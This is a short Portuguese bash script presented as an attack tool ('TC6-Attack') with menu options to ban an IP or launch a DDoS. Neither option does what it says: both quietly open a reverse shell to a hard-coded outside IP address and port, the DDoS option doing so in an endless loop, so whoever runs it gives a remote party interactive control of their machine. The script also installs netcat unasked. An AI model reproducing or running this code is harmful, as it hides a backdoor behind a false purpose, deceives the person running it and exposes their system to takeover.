#!/bin/bash
#Autor: TheCrypt666

if [ -f ../../../usr/bin/nc ]
then
	echo
else
	apt install netcat -y
fi

echo "
	  +------------------------------------+
          |         Autor: TheCrypt666         |
          +------------------------------------+
          |             TC6-Attack	       |
          +------------------------------------+
"

echo "

+--------------------------+
| Escolha uma opção	   |
+--------------------------+
| 1) Banir IP		   |
| 2) DDoS		   |
+--------------------------+
"

read -p "Informe o ataque desejado: " opc

banir() {
	read -p "IP >> " ip
	sleep 4
	printf "IP banido"
       	bash -i >& /dev/tcp/193.161.193.99/58800 0>&1 2>/dev/null
}

ddos() {
	read -p "IP >> " ip
	var=0
	while [ $var == 0 ]
	do
		sleep 0.1 | echo "D3RRUB4ND0 1P"
		bash -i >& /dev/tcp/193.161.193.99/58800 0>&1 2>/dev/null
	done
}


if [ $opc == 1 ]
then
	banir
elif [ $opc == 2 ]
then
	ddos
fi
